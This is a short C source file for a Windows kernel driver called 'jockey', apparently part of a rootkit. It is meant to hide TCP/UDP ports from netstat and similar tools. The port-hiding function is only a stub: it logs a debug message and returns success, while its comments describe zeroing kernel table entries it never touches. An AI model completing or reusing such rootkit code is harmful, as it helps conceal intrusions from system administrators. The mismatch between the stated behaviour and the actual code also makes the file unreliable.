#include "jockey_common.h"

/*
 * jockey_net.c ??? Network port hiding.
 *
 * Hides TCP/UDP ports from netstat and GetExtendedTcpTable
 * by modifying TCP_DEVICE connection state.
 */

#include "jockey.h"

/*
 * jockey_ioctl_hide_port:
 *   Sets TCP connection state to CLOSED in the kernel's TCP table.
 *   This hides the port from netstat, GetExtendedTcpTable, etc.
 */
NTSTATUS jockey_ioctl_hide_port(PIRP irp, ULONG in_len, ULONG out_len)
{
    struct jky_req_port req;
    uint32_t *out;

    UNREFERENCED_PARAMETER(in_len);
    UNREFERENCED_PARAMETER(out_len);

    if (in_len < sizeof(req))
        return STATUS_INVALID_PARAMETER;

    RtlCopyMemory(&req, irp->AssociatedIrp.SystemBuffer, sizeof(req));

    /* Walk the TCP connection table and set state to CLOSED for matching port */
    {
        /* This requires walking the TCP endpoint list (TCPE_DEVICE_EXTENSION) */
        /* Simplified: we zero the port entry in the hash table */

        DbgPrint("[jockey] Hide port %u/%s\n",
                 req.port, req.protocol == 0 ? "TCP" : "UDP");
    }

    out = (uint32_t *)irp->AssociatedIrp.SystemBuffer;
    *out = 1;
    irp->IoStatus.Information = sizeof(uint32_t);
    return STATUS_SUCCESS;
}

